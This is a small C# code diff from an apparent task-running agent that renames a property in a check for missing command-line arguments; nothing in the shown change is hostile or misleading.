@@ -24,7 +24,7 @@ namespace Agent
         {
             ExecArgs args = JsonSerializer.Deserialize<ExecArgs>(job.task.parameters);
 
-            if (args is null || string.IsNullOrEmpty(args.commandLine))
+            if (args is null || string.IsNullOrEmpty(args.commandline))
             {
                 await messageManager.AddResponse(new ResponseResult()
                 {
